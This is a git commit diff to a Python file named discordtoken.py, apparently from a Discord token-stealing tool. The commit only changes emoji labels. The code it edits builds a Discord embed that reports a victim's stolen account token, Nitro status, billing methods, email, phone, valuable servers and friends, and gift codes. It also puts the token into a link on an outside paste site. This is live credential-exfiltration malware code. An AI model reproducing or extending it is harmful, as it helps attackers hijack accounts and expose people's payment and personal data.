4a667dbc68c404885b6314ec5d017c05b5d7d6fa
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 12:05:30 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -342,25 +342,25 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="🗒Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="💎Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="🏷Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="💳Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
 
 
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name="📨Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="📞Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
 
             if hq_guilds != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="🧷HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="🧷HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
             if codes != None:
-                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="🎁Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="created by: readdone#9772")
